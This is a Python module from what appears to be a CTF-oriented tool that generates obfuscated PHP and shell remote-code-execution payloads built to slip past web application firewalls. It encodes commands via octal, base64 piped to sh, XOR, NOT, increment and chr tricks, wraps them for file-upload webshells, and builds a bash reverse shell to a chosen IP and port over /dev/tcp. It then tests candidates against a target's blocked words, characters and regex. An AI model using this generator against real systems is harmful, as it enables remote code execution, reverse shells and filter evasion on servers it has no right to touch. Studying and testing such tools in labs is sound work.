from dataclasses import dataclass

from . import bypass_data
from . import utils


@dataclass
class BypassOptions:
    flagfile: str
    read_env: bool
    reflect_shell: bool
    ip: str
    port: int
    phpinfo: bool
    php_version: float = 7.0
    upload: bool = False


def _octal_encode(command: str):
    encoded = "".join(f"\\{oct(ord(c))[2:]}" for c in command)
    return f"$'{encoded}'"


def _wildcard_bypass(path: str):
    if not path or path == "/":
        return path
    parts = path.split("/")
    new_parts = []
    for part in parts:
        if len(part) > 1:
            new_parts.append(part[0] + "?" * (len(part) - 1))
        else:
            new_parts.append(part)
    return "/".join(new_parts)


def _base64_pipe_bypass(command: str):
    import base64

    b64_cmd = base64.b64encode(command.encode()).decode()

    assign_base64, concat_base64 = utils._split_string_to_vars("base64")
    assign_sh, concat_sh = utils._split_string_to_vars("sh")
    assign_echo, concat_echo = utils._split_string_to_vars("echo")

    return (
        f"{assign_base64}{assign_sh}{assign_echo} "
        f"{concat_echo} {b64_cmd}| {concat_base64} -d| {concat_sh}"
    )


def _render_backtick_payloads(command: str):
    payloads = []
    for template in bypass_data.BACKTICK_TEMPLATES:
        if "{cmd}" in template:
            payloads.append(template.format(cmd=command))
        elif "{path}" in template:
            payloads.append(template.format(path=command))
    return payloads


def _escape_php_single_quote(command: str):
    return command.replace("\\", "\\\\").replace("'", "\\'")


def _build_popen_payload(command: str):
    escaped = _escape_php_single_quote(command)
    return (
        f"$__h=popen('{escaped}','r');"
        "if($__h){echo stream_get_contents($__h);pclose($__h);}"
    )


def _build_proc_open_payload(command: str):
    escaped = _escape_php_single_quote(command)
    return (
        "$__spec=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];"
        f"$__p=proc_open('{escaped}',$__spec,$__pipes);"
        "if(is_resource($__p)){"
        "echo stream_get_contents($__pipes[1]);"
        "if(isset($__pipes[0])){fclose($__pipes[0]);}"
        "if(isset($__pipes[1])){fclose($__pipes[1]);}"
        "if(isset($__pipes[2])){fclose($__pipes[2]);}"
        "proc_close($__p);}"
    )


def _build_chr_exec_payload(func: str, command: str):
    chr_func = utils.generate_php_chr(func)
    chr_arg = utils.generate_php_chr(command)
    return f"$_={chr_func};$_({chr_arg});"


def _build_popen_chr_payload(command: str):
    chr_func = utils.generate_php_chr("popen")
    chr_arg = utils.generate_php_chr(command)
    return (
        f"$__f={chr_func};"
        f"$__h=$__f({chr_arg},'r');"
        "if($__h){echo stream_get_contents($__h);pclose($__h);}"
    )


def _build_proc_open_chr_payload(command: str):
    chr_func = utils.generate_php_chr("proc_open")
    chr_arg = utils.generate_php_chr(command)
    return (
        f"$__f={chr_func};"
        "$__spec=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];"
        f"$__p=$__f({chr_arg},$__spec,$__pipes);"
        "if(is_resource($__p)){"
        "echo stream_get_contents($__pipes[1]);"
        "if(isset($__pipes[0])){fclose($__pipes[0]);}"
        "if(isset($__pipes[1])){fclose($__pipes[1]);}"
        "if(isset($__pipes[2])){fclose($__pipes[2]);}"
        "proc_close($__p);}"
    )


def _to_php_expr(payload: str):
    expr = payload.strip()
    if not expr:
        return None
    if expr.endswith(";"):
        expr = expr[:-1].strip()
    if not expr:
        return None
    return expr


def _render_upload_wrapper(template: str, payload: str, expr: str):
    if "{expr}" in template:
        if expr is None:
            return None
        return template.format(payload=payload, expr=expr)
    return template.format(payload=payload, expr=expr)


def _is_upload_wrapper_like_payload(payload: str):
    normalized = payload.strip().lower()
    if not normalized:
        return False
    if normalized.startswith("<?"):
        return True
    if normalized.startswith("<%"):
        return True
    if normalized.startswith('<script language="php">'):
        return True
    if normalized.startswith("gif89a<?"):
        return True
    if normalized.startswith("gif89a<%"):
        return True
    if normalized.startswith('gif89a<script language="php">'):
        return True
    if "<?" in normalized and "?>" in normalized:
        return True
    if "<%" in normalized and "%>" in normalized:
        return True
    if '<script language="php">' in normalized and "</script>" in normalized:
        return True
    return False


def _is_php_style_payload(payload: str):
    stripped = payload.strip()
    lowered = stripped.lower()
    if not stripped:
        return False

    if _is_upload_wrapper_like_payload(stripped):
        return True

    if lowered.startswith("`") and lowered.endswith("`"):
        return True

    php_prefixes = (
        "phpinfo(",
        "print_r(",
        "var_dump(",
        "var_export(",
        "echo ",
        "echo(",
        "print(",
        "show_source(",
        "highlight_file(",
        "readgzfile(",
        "include ",
        "include(",
        "require ",
        "require(",
        "include_once(",
        "require_once(",
        "eval(",
        "assert(",
        "call_user_func(",
        "die(",
        "exit(",
        "$",
        "(~",
    )
    if lowered.startswith(php_prefixes):
        return True

    if "$_=" in lowered or "get_defined_vars" in lowered or "getallheaders" in lowered:
        return True

    return False


def _is_shell_style_payload(payload: str):
    stripped = payload.strip()
    if not stripped:
        return False
    if _is_upload_wrapper_like_payload(stripped):
        return False
    return not _is_php_style_payload(stripped)


def _apply_upload_php_wrappers(payloads, php_version: float):
    templates = list(bypass_data.SHORT_TAG_TEMPLATES)
    templates.extend(bypass_data.UPLOAD_MODERN_WRAPPER_TEMPLATES)
    if php_version < 7.0:
        templates.extend(bypass_data.UPLOAD_LEGACY_WRAPPER_TEMPLATES)

    wrapped = []
    for payload in payloads:
        if not _is_php_style_payload(payload):
            continue
        if _is_upload_wrapper_like_payload(payload):
            continue
        expr = _to_php_expr(payload)
        for template in templates:
            rendered = _render_upload_wrapper(template, payload, expr)
            if rendered:
                wrapped.append(rendered)
    return wrapped


def _apply_upload_shell_wrappers(payloads):
    wrapped = []
    for payload in payloads:
        if not _is_shell_style_payload(payload):
            continue
        cmd = payload.strip()
        for template in bypass_data.UPLOAD_SHELL_CMD_WRAPPER_TEMPLATES:
            wrapped.append(template.format(cmd=cmd))
    return wrapped


def _analyze_block_reasons(payload: str, waf_words, waf_chars, waf_regex):
    reasons = {
        "blocked_words": [],
        "blocked_chars": [],
        "regex_match": None,
    }

    lower_payload = payload.lower()
    if waf_words:
        for word in waf_words:
            if word and word.lower() in lower_payload:
                reasons["blocked_words"].append(word)

    if waf_chars:
        reasons["blocked_chars"] = [ch for ch in set(payload) if ch in waf_chars]

    if waf_regex:
        match = waf_regex.search(payload)
        if match:
            reasons["regex_match"] = match.group(0)

    return reasons


def _apply_space_replacements(payload: str):
    if " " not in payload:
        return [payload]

    candidates = [payload]
    for replacement in bypass_data.SPACE_BYPASS_REPLACEMENTS:
        candidates.append(payload.replace(" ", replacement))
    return utils.dedupe_preserve_order(candidates)


def _is_space_blocked(reasons):
    if " " in reasons["blocked_chars"]:
        return True
    if any(" " in word for word in reasons["blocked_words"]):
        return True
    regex_match = reasons["regex_match"]
    if regex_match and " " in regex_match:
        return True
    return False


def _apply_targeted_replacements(payload: str, waf_words, waf_chars, waf_regex):
    reasons = _analyze_block_reasons(payload, waf_words, waf_chars, waf_regex)
    candidates = [payload]

    if _is_space_blocked(reasons):
        candidates.extend(_apply_space_replacements(payload))

    return utils.dedupe_preserve_order(candidates)


def _build_targeted_candidates(payloads, waf_words, waf_chars, waf_regex):
    targeted = []
    for payload in payloads:
        targeted.extend(_apply_targeted_replacements(payload, waf_words, waf_chars, waf_regex))
    return utils.dedupe_preserve_order(targeted)


def _append_increment_with_url(payloads, raw_payload: str):
    payloads.append(raw_payload)
    encoded_payload = utils.url_encode(raw_payload)
    if encoded_payload != raw_payload:
        payloads.append(encoded_payload)


def _generate_php_rce_payloads(command: str, php_version: float):
    payloads = []
    payloads.extend(_render_backtick_payloads(command))

    for func in bypass_data.PHP_EXEC_WRAPPERS:
        if func in {"popen", "proc_open"}:
            continue

        if php_version >= 7.0:
            not_func = utils.generate_php_not(func)
            not_arg = utils.generate_php_not(command)
            if not_func and not_arg:
                payloads.append(f"{not_func}({not_arg});")

        xor_func = utils.generate_php_xor(func)
        xor_arg = utils.generate_php_xor(command)
        if xor_func and xor_arg:
            payloads.append(f"$_={xor_func};$_({xor_arg});")

        inc_func_code = utils.generate_php_increment(func)
        if inc_func_code and xor_arg:
            increment_payload = f"{inc_func_code};$_____({xor_arg});"
            _append_increment_with_url(payloads, increment_payload)

        payloads.append(_build_chr_exec_payload(func, command))

    if "popen" in bypass_data.PHP_EXEC_WRAPPERS:
        payloads.append(_build_popen_payload(command))
        payloads.append(_build_popen_chr_payload(command))
    if "proc_open" in bypass_data.PHP_EXEC_WRAPPERS:
        payloads.append(_build_proc_open_payload(command))
        payloads.append(_build_proc_open_chr_payload(command))

    return payloads


def _append_upload_exec_payloads(payloads):
    payloads.extend(bypass_data.UPLOAD_EXEC_TEMPLATES)
    for cmd in bypass_data.UPLOAD_EXEC_TEMPLATES:
        for wrapper in bypass_data.UPLOAD_EXEC_WRAPPER_TEMPLATES:
            payloads.append(wrapper.format(cmd=cmd))


def generate_candidates(options: BypassOptions):
    payloads = []
    target_cmd = None

    root_discovery_mode = (
        options.flagfile == "/"
        and not options.read_env
        and not options.reflect_shell
        and not options.phpinfo
    )

    if options.flagfile:
        if root_discovery_mode:
            payloads.extend(bypass_data.ROOT_DISCOVERY_TEMPLATES)
            payloads.extend(bypass_data.DIRECTORY_ENUM_TEMPLATES)
        else:
            target_cmd = f"cat {options.flagfile}"

            for template in bypass_data.READFILE_TEMPLATES:
                payloads.append(template.format(path=options.flagfile, keyword="flag"))
                payloads.append(template.format(path=_wildcard_bypass(options.flagfile), keyword="flag"))
                payloads.append(template.format(path=utils.obfuscate_filename_escape(options.flagfile), keyword="flag"))
                payloads.append(template.format(path=utils.obfuscate_filename_quotes(options.flagfile), keyword="flag"))

            path_variants = [
                options.flagfile,
                _wildcard_bypass(options.flagfile),
                utils.obfuscate_filename_escape(options.flagfile),
                utils.obfuscate_filename_quotes(options.flagfile),
            ]
            for cmd_template in bypass_data.BACKTICK_COMMAND_TEMPLATES:
                for path_variant in path_variants:
                    cmd = cmd_template.format(path=path_variant)
                    payloads.extend(_render_backtick_payloads(cmd))

            for template in bypass_data.INCLUDE_TEMPLATES:
                payloads.append(template.format(path=options.flagfile))

            payloads.extend(bypass_data.FILE_ENUM_TEMPLATES)
            if options.flagfile == "/":
                payloads.extend(bypass_data.ROOT_DISCOVERY_TEMPLATES)

    if options.read_env:
        payloads.extend(bypass_data.READ_ENV_TEMPLATES)
        _append_upload_exec_payloads(payloads)
        target_cmd = "env"

    if options.reflect_shell:
        for template in bypass_data.REFLECT_SHELL_TEMPLATES:
            payloads.append(template.format(ip=options.ip, port=options.port))

        _append_upload_exec_payloads(payloads)

        shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{options.ip}/{options.port} 0>&1'"
        for template in bypass_data.WEBSHELL_TEMPLATES:
            payloads.append(template.format(cmd=shell_cmd))

        target_cmd = shell_cmd

    if options.phpinfo:
        for template in bypass_data.PHPINFO_TEMPLATES:
            if template.startswith("(") and template.endswith(");") and options.php_version < 7.0:
                continue
            payloads.append(template)
        target_cmd = "phpinfo"

    if options.read_env or options.phpinfo:
        payloads.extend(bypass_data.HEADER_EXEC_TEMPLATES)

    if options.reflect_shell or options.phpinfo:
        payloads.extend(bypass_data.VARIABLE_HIJACK_TEMPLATES)

    if target_cmd:
        payloads.append(bypass_data.NON_ALNUM_ASSERT_POST_PAYLOAD)
        if target_cmd == "phpinfo":
            inc_code = utils.generate_php_increment("phpinfo")
            if inc_code:
                increment_payload = f"{inc_code};$_____();"
                _append_increment_with_url(payloads, increment_payload)

            if options.php_version >= 7.0:
                not_code = utils.generate_php_not("phpinfo")
                payloads.append(f"{not_code}();")

            chr_phpinfo = utils.generate_php_chr("phpinfo")
            payloads.append(f"$_={chr_phpinfo};$_();")
        else:
            payloads.extend(_generate_php_rce_payloads(target_cmd, options.php_version))

    if options.upload:
        raw_payloads = payloads.copy()
        shell_wrapped = _apply_upload_shell_wrappers(raw_payloads)
        php_wrapped = _apply_upload_php_wrappers(raw_payloads, options.php_version)
        existing_wrapped = [p for p in raw_payloads if _is_upload_wrapper_like_payload(p)]
        payloads = utils.dedupe_preserve_order(shell_wrapped + php_wrapped + existing_wrapped)

    if not options.upload:
        base_payloads = payloads.copy()
        for payload in base_payloads:
            if ";" not in payload and "(" not in payload:
                payloads.append(_base64_pipe_bypass(payload))

    if not root_discovery_mode and not options.upload:
        simple_cmds = ["ls", "cat /flag", "tac /flag", "env"]
        for cmd in simple_cmds:
            payloads.append(_octal_encode(cmd))

    candidates = utils.dedupe_preserve_order(payloads)
    candidates = [payload for payload in candidates if payload != "`/`"]
    return candidates


def apply_encodings(payloads, strategies):
    encoded = []
    for payload in payloads:
        for _name, encoder in strategies:
            try:
                encoded.append(encoder(payload))
            except Exception:
                continue
    return utils.dedupe_preserve_order(encoded)


def filter_payloads(
    payloads,
    waf_words,
    waf_chars,
    waf_regex,
    limit_length,
    show_progress=True,
    verbose=False,
):
    passed = []
    progress = ProgressBar(len(payloads), verbose=verbose) if show_progress else None
    for idx, payload in enumerate(payloads, start=1):
        if progress:
            progress.update(idx)
        if utils.is_payload_allowed(payload, waf_words, waf_chars, waf_regex, limit_length):
            passed.append(payload)
            if progress:
                progress.mark_pass(payload)
    if progress:
        progress.finish()
    return passed


class ProgressBar:
    def __init__(self, total, width=24, stream=None, verbose=False):
        import sys

        self.total = max(int(total), 0)
        self.width = max(int(width), 5)
        self.stream = stream or sys.stdout
        self.current = 0
        self.passed = 0
        self.verbose = verbose
        self.last_snapshot = None

        isatty = getattr(self.stream, "isatty", None)
        self.dynamic = bool(isatty() if callable(isatty) else False)

        if not self.dynamic:
            self._write_line(end="\n", force=True)

    def update(self, current):
        self.current = current
        if self.dynamic:
            self._write_line()

    def mark_pass(self, payload):
        self.passed += 1
        if self.verbose:
            if self.dynamic:
                self._write_line(end="\n", force=True)
            self._write(f"PASS: {payload}\n")
            if self.dynamic:
                self._write_line(force=True)
        elif self.dynamic:
            self._write_line()

    def finish(self):
        self.current = self.total
        if self.dynamic:
            if self.last_snapshot == (self.current, self.passed):
                self._write("\n")
            else:
                self._write_line(end="\n")
        else:
            self._write_line(end="\n", force=True)

    def _write_line(self, end="", force=False):
        snapshot = (self.current, self.passed)
        if not force and snapshot == self.last_snapshot:
            return
        self.last_snapshot = snapshot

        bar = self._render_bar()
        if self.dynamic:
            msg = f"\r\033[2K{bar} {self.current}/{self.total} passed:{self.passed}"
        else:
            msg = f"{bar} {self.current}/{self.total} passed:{self.passed}"
        self._write(msg + end)

    def _render_bar(self):
        if self.total <= 0:
            filled = 0
        else:
            filled = int(self.width * (self.current / self.total))
        return "[" + ("=" * filled).ljust(self.width, ".") + "]"

    def _write(self, text):
        self.stream.write(text)
        self.stream.flush()
